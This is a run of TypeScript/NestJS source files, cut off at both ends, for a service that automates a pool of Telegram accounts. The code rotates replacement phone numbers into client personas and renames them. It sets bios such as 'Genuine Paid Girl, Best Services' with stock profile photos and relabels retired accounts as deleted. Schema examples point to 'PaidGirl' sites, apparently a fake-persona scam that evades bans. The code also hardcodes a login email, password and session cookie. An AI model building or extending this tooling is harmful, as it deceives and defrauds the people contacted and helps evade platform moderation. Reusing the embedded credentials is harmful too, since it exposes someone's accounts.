Promise<Client> {\n        const client = this.clientsMap.get(clientId)\n        if (client) {\n            return client;\n        } else {\n            const user = await this.clientModel.findOne({ clientId }, { _id: 0, updatedAt: 0 }).lean().exec();\n            this.clientsMap.set(clientId, user);\n            if (!user && throwErr) {\n                throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\n            }\n            return user;\n        }\n    }\n\n    async update(clientId: string, updateClientDto: UpdateClientDto): Promise<Client> {\n        delete updateClientDto['_id']\n        if ((<any>updateClientDto)._doc) {\n            delete (<any>updateClientDto)._doc['_id']\n        }\n        await fetchWithTimeout(`${notifbot()}&text=Updating the Existing client: ${clientId}`);\n        const updatedUser = await this.clientModel.findOneAndUpdate({ clientId }, { $set: updateClientDto }, { new: true, upsert: true }).exec();\n        if (!updatedUser) {\n            throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\n        }\n        this.clientsMap.set(clientId, updatedUser);\n        await fetchWithTimeout(`${process.env.uptimeChecker}/refreshmap`);\n        await fetchWithTimeout(`${process.env.uptimebot}/refreshmap`);\n        console.log(\"Refreshed Maps\")\n        return updatedUser;\n    }\n\n    async remove(clientId: string): Promise<Client> {\n        const deletedUser = await this.clientModel.findOneAndDelete({ clientId }).exec();\n        if (!deletedUser) {\n            throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\n        }\n        return deletedUser;\n    }\n\n    async search(filter: any): Promise<Client[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.clientModel.find(filter).exec();\n    }\n\n    async setupClient(clientId: string, setupClientQueryDto: SetupClientQueryDto) {\n        console.log(`Received New Client Request for - ${clientId}`)\n        if (toBoolean(process.env.AUTO_CLIENT_SETUP) && Date.now() > (settingupClient + 240000)) {\n            settingupClient = Date.now();\n            const existingClient = await this.findOne(clientId);\n            const existingClientMobile = existingClient.mobile\n            await fetchWithTimeout(`${notifbot()}&text=Received New Client Request for - ${clientId} - OldNumber: ${existingClient.mobile} || ${existingClient.username}`);\n            console.log(setupClientQueryDto);\n            await this.telegramService.disconnectAll();\n            const today = (new Date(Date.now())).toISOString().split('T')[0];\n            const query = { availableDate: { $lte: today }, channels: { $gt: 200 } }\n            const newBufferClient = (await this.bufferClientService.executeQuery(query, { tgId: 1 }))[0];\n            try {\n                if (newBufferClient) {\n                    this.telegramService.setActiveClientSetup({ ...setupClientQueryDto, clientId, existingMobile: existingClientMobile, newMobile: newBufferClient.mobile })\n\n                    await this.telegramService.createClient(newBufferClient.mobile);\n                    const newSession = await this.telegramService.createNewSession(newBufferClient.mobile);\n                    await this.telegramService.deleteClient(newBufferClient.mobile)\n                    await this.updateClientSession(newSession)\n                } else {\n                    await fetchWithTimeout(`${notifbot()}&text=Buffer Clients not available`);\n                    console.log(\"Buffer Clients not available\")\n                }\n\n                // const archivedClient = await this.archivedClientService.findOne(newBufferClient.mobile)\n                // if (archivedClient) {\n                //     await fetchWithTimeout(`${notifbot()}&text=Using Old Session from Archived Clients- NewNumber:${newBufferClient.mobile}`);\n                //     await this.updateClientSession(archivedClient.session)\n                // } else {\n                //     await this.telegramService.createClient(newBufferClient.mobile, false, true);\n                //     await this.generateNewSession(newBufferClient.mobile)\n                // }\n            } catch (error) {\n                parseError(error);\n                await this.telegramService.deleteClient(newBufferClient.mobile);\n                console.log(\"Removing buffer as error\")\n                const availableDate = (new Date(Date.now() + (3 * 24 * 60 * 60 * 1000))).toISOString().split('T')[0]\n                await this.bufferClientService.createOrUpdate(newBufferClient.mobile, { availableDate });\n                this.telegramService.setActiveClientSetup(undefined)\n            }\n        } else {\n            console.log(\"Profile Setup Recently tried, wait ::\", settingupClient - Date.now());\n        }\n    }\n\n    async updateClientSession(newSession: string) {\n        try {\n            const setup = this.telegramService.getActiveClientSetup();\n            const { days, archiveOld, clientId, existingMobile, formalities, newMobile } = setup;\n            await this.telegramService.disconnectAll();\n            await sleep(2000)\n            let updatedUsername;\n            await this.telegramService.createClient(newMobile, false, true);\n            const username = (clientId?.match(/[a-zA-Z]+/g)).toString();\n            const userCaps = username[0].toUpperCase() + username.slice(1);\n            let baseUsername = `${userCaps}_Red` + fetchNumbersFromString(clientId)\n            updatedUsername = await this.telegramService.updateUsername(newMobile, baseUsername);\n            await fetchWithTimeout(`${notifbot()}&text=Updated username for NewNumber:${newMobile} || ${updatedUsername}`);\n            await this.telegramService.deleteClient(newMobile);\n            const existingClientUser = (await this.usersService.search({ mobile: existingMobile }))[0];\n            const existingClient = await this.findOne(clientId);\n            this.update(clientId, { mobile: newMobile, username: updatedUsername, session: newSession });\n            await fetchWithTimeout(existingClient.deployKey, {}, 1);\n            await this.bufferClientService.remove(newMobile);\n            setTimeout(async () => {\n                await this.updateClient(clientId);\n            }, 10000);\n\n            try {\n                if (existingClientUser) {\n                    try {\n                        if (toBoolean(formalities)) {\n                            await this.telegramService.createClient(existingMobile, false, true);\n                            console.log(\"Started Formalities\");\n                            await this.telegramService.updateNameandBio(existingMobile, 'Deleted Account', `New Acc: @${updatedUsername}`);\n                            await this.telegramService.deleteProfilePhotos(existingMobile)\n                            await this.telegramService.updateUsername(existingMobile, '');\n                            await this.telegramService.updatePrivacyforDeletedAccount(existingMobile);\n                            console.log(\"Formalities finished\");\n                            await this.telegramService.deleteClient(existingMobile);\n                            await fetchWithTimeout(`${notifbot()}&text=Formalities finished`);\n                        } else {\n                            console.log(\"Formalities skipped\")\n                        }\n                        if (archiveOld) {\n                            const availableDate = (new Date(Date.now() + ((days + 1) * 24 * 60 * 60 * 1000))).toISOString().split('T')[0];\n                            const bufferClientDto: CreateBufferClientDto | UpdateBufferClientDto = {\n                                mobile: existingMobile,\n                                availableDate,\n                                session: existingClientUser.session,\n                                tgId: existingClientUser.tgId,\n                                channels: 170\n                            }\n                            const updatedBufferClient = await this.bufferClientService.createOrUpdate(existingMobile, bufferClientDto);\n                            // await this.archivedClientService.update(existingMobile, existingClient);\n                            console.log(\"client Archived: \", updatedBufferClient);\n                            await fetchWithTimeout(`${notifbot()}&text=Client Archived`);\n                        } else {\n                            console.log(\"Client Archive Skipped\")\n                            await fetchWithTimeout(`${notifbot()}&text=Client Archive Skipped`);\n                        }\n                    } catch (error) {\n                        console.log(\"Cannot Archive Old Client\");\n                        const errorDetails = parseError(error);\n                        if (contains(errorDetails.message.toLowerCase(), ['expired', 'unregistered', 'deactivated', \"session_revoked\", \"user_deactivated_ban\"])) {\n                            console.log(\"Deleting User: \", existingClientUser.mobile);\n                            await this.bufferClientService.remove(existingClientUser.mobile);\n                            await this.archivedClientService.remove(existingClientUser.mobile);\n                        } else {\n                            console.log('Not Deleting user');\n                        }\n                    }\n                }\n            } catch (error) {\n                parseError(error);\n            }\n            this.telegramService.setActiveClientSetup(undefined)\n\n            console.log(\"Update finished Exitting Exiiting TG Service\");\n            await fetchWithTimeout(`${notifbot()}&text=Update finished`);\n            await this.telegramService.disconnectAll();\n\n        } catch (e) {\n            parseError(e);\n            this.telegramService.setActiveClientSetup(undefined)\n        }\n    }\n\n    async updateClient(clientId: string) {\n        const now = Date.now();\n        const lastUpdate = this.lastUpdateMap.get(clientId) || 0;\n        const cooldownPeriod = 30000;\n        if (now - lastUpdate < cooldownPeriod) {\n            console.log(`Skipping update for ${clientId} - cooldown period not elapsed. Try again in ${Math.ceil((cooldownPeriod - (now - lastUpdate)) / 1000)} seconds`);\n            return;\n        }\n\n        const client = await this.findOne(clientId);\n        try {\n            this.lastUpdateMap.set(clientId, now);\n            await CloudinaryService.getInstance(client?.dbcoll?.toLowerCase());\n            const telegramClient = await this.telegramService.createClient(client.mobile, true, false);\n            await sleep(2000)\n            const me = await telegramClient.getMe();\n            if (me.username !== client.username || !me.username.toLowerCase().startsWith(me.firstName.split(' ')[0].toLowerCase())) {\n                const username = (clientId?.match(/[a-zA-Z]+/g)).toString();\n                const userCaps = username[0].toUpperCase() + username.slice(1);\n                let baseUsername = `${userCaps}_Red` + fetchNumbersFromString(clientId);\n                const updatedUsername = await telegramClient.updateUsername(baseUsername);\n                await this.update(client.clientId, { username: updatedUsername })\n            }\n            await sleep(1000)\n            if (me.firstName !== client.name) {\n                await telegramClient.updateProfile(client.name, \"Genuine Paid Girl🥰, Best Services❤️\");\n            }\n            await sleep(1000)\n            await telegramClient.deleteProfilePhotos();\n            await sleep(1000)\n            await telegramClient.updatePrivacy();\n            await sleep(1000)\n            const rootPath = process.cwd();\n            console.log(rootPath, \"trying to update dp\");\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));\n            await sleep(1000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp2.jpg'));\n            await sleep(1000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp3.jpg'));\n            await sleep(1000);\n            await this.telegramService.deleteClient(client.mobile)\n        } catch (error) {\n            // Remove the cooldown on error so it can be retried\n            this.lastUpdateMap.delete(clientId);\n            parseError(error)\n        }\n    }\n\n    async updateClients() {\n        const clients = await this.findAll();\n        for (const client of clients) {\n            await this.updateClient(client.clientId)\n        }\n    }\n\n    async generateNewSession(phoneNumber: string, attempt: number = 1) {\n        try {\n            console.log(\"String Generation started\");\n            await fetchWithTimeout(`${notifbot()}&text=String Generation started for NewNumber:${phoneNumber}`);\n            await sleep(1000);\n            const response = await fetchWithTimeout(`${process.env.uptimebot}/login?phone=${phoneNumber}&force=${true}`, { timeout: 15000 }, 1);\n            if (response) {\n                console.log(`Code Sent successfully`, response.data);\n                await fetchWithTimeout(`${notifbot()}&text=Code Sent successfully`);\n                await this.bufferClientService.update(phoneNumber, { availableDate: (new Date(Date.now() + (24 * 60 * 60 * 1000))).toISOString().split('T')[0] })\n            } else {\n                await fetchWithTimeout(`${notifbot()}&text=Failed to send Code`);\n                console.log(\"Failed to send Code\", response);\n                if (attempt < 2) {\n                    await sleep(8000);\n                    await this.generateNewSession(phoneNumber, attempt + 1);\n                }\n            }\n        } catch (error) {\n            console.log(error);\n            if (attempt < 2) {\n                await sleep(8000);\n                await this.generateNewSession(phoneNumber, attempt + 1);\n            }\n        }\n    }\n\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<Client[]> {\n        try {\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            const queryExec = this.clientModel.find(query);\n\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    async addPromoteMobile(clientId: string, mobileNumber: string): Promise<Client> {\n        return this.clientModel.findOneAndUpdate(\n            { clientId }, // Filter by clientId\n            { $addToSet: { promoteMobile: mobileNumber } }, // Add only if it doesn't already exist\n            { new: true } // Return the updated document\n        ).exec();\n    }\n\n    async removePromoteMobile(clientId: string, mobileNumber: string): Promise<Client> {\n        return this.clientModel.findOneAndUpdate(\n            { clientId }, // Filter by clientId\n            { $pull: { promoteMobile: mobileNumber } }, // Remove the specified number\n            { new: true } // Return the updated document\n        ).exec();\n    }\n}\n","import { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateClientDto {\n    @ApiProperty({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' })\n    readonly channelLink: string;\n\n    @ApiProperty({ example: 'shruthi', description: 'Database collection name' })\n    readonly dbcoll: string;\n\n    @ApiProperty({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' })\n    readonly link: string;\n\n    @ApiProperty({ example: 'Shruthi Reddy', description: 'Name of the user' })\n    readonly name: string;\n\n    @ApiProperty({ example: '+916265240911', description: 'Phone number of the user' })\n    readonly mobile: string;\n\n    @ApiProperty({ example: 'Ajtdmwajt1@', description: 'Password of the user' })\n    readonly password: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' })\n    readonly repl: string;\n\n    @ApiProperty({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' })\n    readonly promoteRepl: string;\n\n    @ApiProperty({ example: '1BQANOTEuMTA4LjUg==', description: 'Session token' })\n    readonly session: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Username of the user' })\n    readonly username: string;\n\n    @ApiProperty({ example: 'shruthi1', description: 'Client ID of the user' })\n    readonly clientId: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' })\n    readonly deployKey: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Main account of the user' })\n    readonly mainAccount: string;\n\n    @ApiProperty({ example: 'booklet_10', description: 'Product associated with the user' })\n    readonly product: string;\n\n    @ApiProperty({ example: ['916265240911'], description: 'Promote mobile number of the user', required: false, type: [String] })\n    readonly promoteMobile?: string[];\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { Transform, TransformFnParams } from 'class-transformer';\nimport { IsOptional, IsString, IsArray, IsUrl, Matches, ArrayNotEmpty } from 'class-validator';\n\nexport class SearchClientDto {\n    @ApiPropertyOptional({ description: 'Client ID of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n    @IsOptional()\n    @IsString()\n    @Matches(/^[a-z0-9_-]{3,50}$/i, { message: 'Invalid client ID format' })\n    clientId?: string;\n\n    @ApiPropertyOptional({ description: 'Database collection name' })\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n    @IsOptional()\n    @IsString()\n    dbcoll?: string;\n\n    @ApiPropertyOptional({ description: 'Channel link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    channelLink?: string;\n\n    @ApiPropertyOptional({ description: 'Link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    link?: string;\n\n    @ApiPropertyOptional({ description: 'Name of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    name?: string;\n\n    @ApiPropertyOptional({ description: 'Phone number of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @Matches(/^\\+?[0-9]{10,15}$/, { message: 'Invalid phone number format' })\n    number?: string;\n\n    @ApiPropertyOptional({ description: 'Password of the client' })\n    @IsOptional()\n    @IsString()\n    password?: string;\n\n    @ApiPropertyOptional({ description: 'Repl link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    repl?: string;\n\n    @ApiPropertyOptional({ description: 'Promotion Repl link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    promoteRepl?: string;\n\n    @ApiPropertyOptional({ description: 'Clientname of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    clientName?: string;\n\n    @ApiPropertyOptional({ description: 'Deployment key URL' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    deployKey?: string;\n\n    @ApiPropertyOptional({ description: 'Main account of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n    @IsOptional()\n    @IsString()\n    mainAccount?: string;\n\n    @ApiPropertyOptional({ description: 'Product associated with the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    product?: string;\n\n    @ApiPropertyOptional({ description: 'Promote mobile numbers of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.map((v: string) => v?.trim()))\n    @IsOptional()\n    @IsArray()\n    @ArrayNotEmpty({ message: 'Promote mobile numbers must not be empty if provided' })\n    @Matches(/^\\+?[0-9]{10,15}$/, { each: true, message: 'Invalid phone number format in promoteMobile' })\n    promoteMobile?: string[];\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateClientDto } from './create-client.dto';\n\nexport class UpdateClientDto extends PartialType(CreateClientDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type ClientDocument = Client & Document;\n\n@Schema({\n    collection: 'clients', versionKey: false, autoIndex: true, timestamps: true,\n    toJSON: {\n        virtuals: true,\n        transform: (doc, ret) => {\n            delete ret._id;\n        },\n    },\n})\nexport class Client {\n    @ApiProperty({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' })\n    @Prop({ required: true })\n    channelLink: string;\n\n    @ApiProperty({ example: 'shruthi', description: 'Database collection name' })\n    @Prop({ required: true })\n    dbcoll: string;\n\n    @ApiProperty({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' })\n    @Prop({ required: true })\n    link: string;\n\n    @ApiProperty({ example: 'Shruthi Reddy', description: 'Name of the user' })\n    @Prop({ required: true })\n    name: string;\n\n    @ApiProperty({ example: '916265240911', description: 'mobile number of the user' })\n    @Prop({ required: true })\n    mobile: string;\n\n    @ApiProperty({ example: 'Ajtdmwajt1@', description: 'Password of the user' })\n    @Prop({ required: true })\n    password: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' })\n    @Prop({ required: true })\n    repl: string;\n\n    @ApiProperty({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' })\n    @Prop({ required: true })\n    promoteRepl: string;\n\n    @ApiProperty({ example: '1BQANOTEuM==', description: 'Session token' })\n    @Prop({ required: true })\n    session: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Username of the user' })\n    @Prop({ required: true })\n    username: string;\n\n    @ApiProperty({ example: 'shruthi1', description: 'Client ID of the user' })\n    @Prop({ required: true })\n    clientId: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' })\n    @Prop({ required: true })\n    deployKey: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Main account of the user' })\n    @Prop({ required: true })\n    mainAccount: string;\n\n    @ApiProperty({ example: 'booklet_10', description: 'Product associated with the user' })\n    @Prop({ required: true })\n    product: string;\n\n    @ApiProperty({ example: ['916265240911'], description: 'Promote mobile number of the user' })\n    @Prop({ required: false, type: [String] })\n    promoteMobile: string[];\n}\n\nexport const ClientSchema = SchemaFactory.createForClass(Client);\n","import {\n    Controller,\n    Get,\n    Post,\n    Put,\n    Param,\n    Body,\n    HttpException,\n    HttpStatus,\n  } from '@nestjs/common';\n  import { NpointService } from './npoint.service';\n  import {\n    ApiTags,\n    ApiOperation,\n    ApiParam,\n    ApiBody,\n    ApiResponse,\n  } from '@nestjs/swagger';\n  \n  @ApiTags('NPoint API') // Group endpoints under \"NPoint API\" in Swagger UI\n  @Controller('npoint')\n  export class NpointController {\n    constructor(private readonly npointService: NpointService) {}\n  \n    @Get('documents/:id')\n    @ApiOperation({ summary: 'Fetch a document by ID' }) // Description of the endpoint\n    @ApiParam({ name: 'id', description: 'The ID of the document to fetch' }) // Document the parameter\n    @ApiResponse({\n      status: 200,\n      description: 'Document fetched successfully',\n    })\n    @ApiResponse({ status: 404, description: 'Document not found' })\n    async fetchDocument(@Param('id') id: string) {\n      try {\n        return await this.npointService.fetchDocument(id);\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.NOT_FOUND);\n      }\n    }\n  \n    @Post('documents')\n    @ApiOperation({ summary: 'Post a new document' })\n    @ApiBody({\n      description: 'The document to post',\n      schema: {\n        example: {\n          title: 'My Document',\n          content: 'This is the content of the document.',\n        },\n      },\n    })\n    @ApiResponse({\n      status: 201,\n      description: 'Document posted successfully',\n    })\n    @ApiResponse({ status: 400, description: 'Invalid input' })\n    async postDocument(@Body() document: any) {\n      try {\n        return await this.npointService.postDocument(document);\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\n      }\n    }\n\n    @Get('documents')\n    @ApiOperation({ summary: 'Fetch all documents' })\n    @ApiResponse({\n      status: 200,\n      description: 'List of all documents fetched successfully',\n    })\n    @ApiResponse({ status: 500, description: 'Internal server error' })\n    async fetchAllDocuments() {\n      try {\n        return await this.npointService.fetchAllDocuments();\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\n      }\n    }  \n  \n    @Put('documents/:id')\n    @ApiOperation({ summary: 'Update a document by ID' })\n    @ApiParam({ name: 'id', description: 'The ID of the document to update' })\n    @ApiBody({\n      description: 'The updated document',\n      schema: {\n        example: {\n          title: 'Updated Document',\n          content: 'This is the updated content of the document.',\n        },\n      },\n    })\n    @ApiResponse({\n      status: 200,\n      description: 'Document updated successfully',\n    })\n    @ApiResponse({ status: 404, description: 'Document not found' })\n    async updateDocument(@Param('id') id: string, @Body() updatedDocument: any) {\n      try {\n        return await this.npointService.updateDocument(id, updatedDocument);\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.NOT_FOUND);\n      }\n    }\n  }","import { Module } from '@nestjs/common';\nimport { NpointService } from './npoint.service';\nimport { NpointController } from './npoint.controller';\n\n@Module({\n  controllers: [NpointController],\n  providers: [NpointService],\n  exports: [NpointService]\n})\nexport class NpointModule {}","import { Injectable, Logger } from '@nestjs/common';\nimport axios from 'axios';\n\n@Injectable()\nexport class NpointService {\n    private readonly logger = new Logger(NpointService.name);\n    private csrfToken: string | null = null;\n    private cookie: string | null = '_npoint_session=MTBOeElFZ0pXV0oxTm9xd1dQQ0tNYnhVYWg1blFCMUVtUUJVWFQ1cGZwdlNwSTdacjBVTStJbDlHaGlWd0pGUDRzUmRaYnZNQVNTMTVmY1R6dEVUd0RPMXVFcmE1cnFYY09qd1A5TFpNVnZOUnVJRnlWV3ZtODk0ajlQVXQ0QzQ0MUtGeU5mTTB5dGFPNCtLUW9tVy9yTmFRZzlRQUdRK0NkQVVtZGxtMVEySzN0TC9sUjdMR2RjVW5xTmtleWw4TWdPOVNMa2JaZEs1c1o3eGE3UHdsQ2JiTEdQbHhUaysraCsrcG9LM25YREdyTDdpYWlHQ0wraEhNV3NXbzJtK1YvVzEvVTh2Z0N5bnpzU1hqcndiM041L2I3R29UMDY3RitBYkxvTktWaUVmdTg4SGJORjRTS25uZ2JDSWhmNWFoem0vNGNvUnAzMDBsQ0FJcUZTMjdnPT0tLWs2a2x2SUZqcHhDN1A0eFdUaWhBeVE9PQ%3D%3D--4d0883b9956c6d2744389228dab7321ff2eb88e5';\n    private readonly baseUrl = 'https://www.npoint.io'; // Replace with your API base URL\n    private readonly signInUrl = 'https://www.npoint.io/users/sign_in'; // Replace with your sign-in API URL\n\n    // Method to fetch CSRF token from the sign-in API\n    private async fetchCsrfToken(): Promise<string> {\n        this.logger.debug('Fetching CSRF token...');\n        try {\n            let data = JSON.stringify({\n                \"user\": {\n                    \"email\": \"dodieajt@gmail.com\",\n                    \"password\": \"Ajtdmwajt1@\"\n                }\n            });\n\n            let config = {\n                method: 'post',\n                maxBodyLength: Infinity,\n                url: this.signInUrl,\n                headers: {\n                    'Content-Type': 'application/json',\n                    'Cookie': this.cookie\n                },\n                data: data\n            };\n\n            const response = await axios.request(config)\n            console.log(\"Cookie:\", response.headers['set-cookie'][0]);\n            this.cookie = response.headers['set-cookie'][0];\n            // Extract CSRF token from the response (adjust based on your API response structure)\n            this.csrfToken = await this.fetchCsrfTokenFromHtml(response.data);\n\n            if (!this.csrfToken) {\n                throw new Error('CSRF token not found in the sign-in response.');\n            }\n\n            this.logger.debug('CSRF token fetched successfully.');\n            return this.csrfToken;\n        } catch (error) {\n            this.logger.error(`Failed to fetch CSRF token: ${error.message}`);\n            throw new Error(`Failed to fetch CSRF token: ${error.message}`);\n        }\n    }\n\n    // Method to ensure CSRF token is available\n    private async ensureCsrfToken(): Promise<void> {\n        if (!this.csrfToken) {\n            await this.fetchCsrfToken();\n        }\n    }\n\n    // Method to fetch a document\n    async fetchDocument(documentId: string): Promise<any> {\n        this.logger.debug(`Fetching document with ID: ${documentId}`);\n        await this.ensureCsrfToken();\n\n        try {\n            const response = await axios.get(`${this.baseUrl}/documents/${documentId}`, {\n                headers: {\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                    'Cookie': this.cookie\n                },\n            });\n\n            this.logger.debug(`Document with ID: ${documentId} fetched successfully.`);\n            return response.data;\n        } catch (error) {\n            this.logger.error(`Failed to fetch document with ID: ${documentId}: ${error.message}`);\n            throw new Error(`Failed to fetch document: ${error.message}`);\n        }\n    }\n\n    // Method to post a document\n    async postDocument(document: any): Promise<any> {\n        this.logger.debug('Posting a new document...');\n        await this.ensureCsrfToken();\n\n        try {\n            const response = await axios.post(`${this.baseUrl}/documents`, { \"generate_contents\": true }, {\n                headers: {\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                    'Cookie': this.cookie\n                },\n            });\n\n            this.logger.debug(`Document posted successfully. Updating document with token: ${response.data.token}`);\n            await this.updateDocument(response.data.token, document);\n            return response.data;\n        } catch (error) {\n            this.logger.error(`Failed to post document: ${error.message}`);\n            throw new Error(`Failed to post document: ${error.message}`);\n        }\n    }\n\n    // Method to update a document\n    async updateDocument(documentId: string, updatedDocument: any): Promise<any> {\n        this.logger.debug(`Updating document with ID: ${documentId}`);\n        await this.ensureCsrfToken();\n\n        // const oldDocument = (await axios.get(`https://api.npoint.io/${documentId}`)).data;\n        const body =\n        {\n            \"contents\": JSON.stringify(updatedDocument),\n            \"original_contents\": JSON.stringify(updatedDocument),\n            \"schema\": null,\n            \"original_schema\": \"\"\n        }\n\n        try {\n            const response = await axios.put(\n                `${this.baseUrl}/documents/${documentId}`,\n                body,\n                {\n                    headers: {\n                        'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                        'Cookie': this.cookie\n                    },\n                },\n            );\n\n            this.logger.debug(`Document with ID: ${documentId} updated successfully.`);\n            return response.data;\n        } catch (error) {\n            this.logger.error(`Failed to update document with ID: ${documentId}: ${error.message}`);\n            throw new Error(`Failed to update document: ${error.message}`);\n        }\n    }\n\n    async fetchAllDocuments(): Promise<any[]> {\n        await this.ensureCsrfToken();\n\n        try {\n            const response = await axios.get(`${this.baseUrl}/documents`, {\n                headers: {\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                    'Cookie': this.cookie\n                },\n            });\n\n            return response.data;\n        } catch (error) {\n            throw new Error(`Failed to fetch all documents: ${error.message}`);\n        }\n    }\n\n    async fetchCsrfTokenFromHtml(data) {\n        try {\n            // Step 1: Use a regular expression to match the CSRF token in the <meta> tag\n            const csrfTokenMatch = data.match(/<meta name=\"csrf-token\" content=\"([^\"]+)\"/);\n\n            // Step 2: Check if the CSRF token was found\n            if (!csrfTokenMatch || !csrfTokenMatch[1]) {\n                throw new Error('CSRF token not found in the HTML response.');\n            }\n\n            // Step 3: Extract the CSRF token\n            const csrfToken = csrfTokenMatch[1];\n\n            // Log the CSRF token (optional)\n            console.log('CSRF Token:', csrfToken);\n\n            return csrfToken;\n        } catch (error) {\n            console.error('Error fetching CSRF token:', error);\n        }\n    }\n}","import { ApiProperty } from '@nestjs/swagger';\nimport {  IsNumber, IsString } from 'class-validator';\n\nexport class CreatePromoteClientDto {\n  @ApiProperty({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsString()\n  readonly tgId: string;\n\n  @ApiProperty({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsString()\n  readonly mobile: string;\n\n  @ApiProperty({\n    description: 'Date of the session',\n    example: '2023-06-22',\n  })\n  @IsString()\n  readonly availableDate: string;\n\n  @ApiProperty({\n    description: 'lastActive identifier',\n    example: '2023-06-22',\n  })\n  @IsString()\n  readonly lastActive: string;\n\n  @ApiProperty({\n    description: 'Channel Count',\n    example: 23,\n    type: Number\n  })\n  @IsNumber()\n  readonly channels: number;\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { IsString, IsBoolean, IsOptional, IsNumber } from 'class-validator';\n\nexport class SearchPromoteClientDto {\n  @ApiPropertyOptional({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsOptional()\n  @IsString()\n  readonly tgId?: string;\n\n  @ApiPropertyOptional({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsOptional()\n  @IsString()\n  readonly mobile?: string;\n\n  @ApiPropertyOptional({\n    description: 'availableDate of the promoteClient',\n    example: '2023-06-22',\n  })\n  @IsOptional()\n  @IsString()\n  readonly availableDate?: string;\n\n  @ApiPropertyOptional({\n    description: 'Channel Count',\n    example: 23,\n    type: Number\n  })\n  @IsNumber()\n  readonly channels?: number;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreatePromoteClientDto } from './create-promote-client.dto';\n\nexport class UpdatePromoteClientDto extends PartialType(CreatePromoteClientDto) {}\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, Put } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody, ApiParam } from '@nestjs/swagger';\nimport { PromoteClientService } from './promote-client.service';\nimport { CreatePromoteClientDto } from './dto/create-promote-client.dto';\nimport { SearchPromoteClientDto } from './dto/search-promote-client.dto';\nimport { PromoteClient } from './schemas/promote-client.schema';\nimport { UpdatePromoteClientDto } from './dto/update-promote-client.dto';\n\n@ApiTags('Promote Clients')\n@Controller('promoteclients')\nexport class PromoteClientController {\n  constructor(private readonly clientService: PromoteClientService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create user data' })\n  async create(@Body() createClientDto: CreatePromoteClientDto): Promise<PromoteClient> {\n    return this.clientService.create(createClientDto);\n  }\n\n  @Get('search')\n  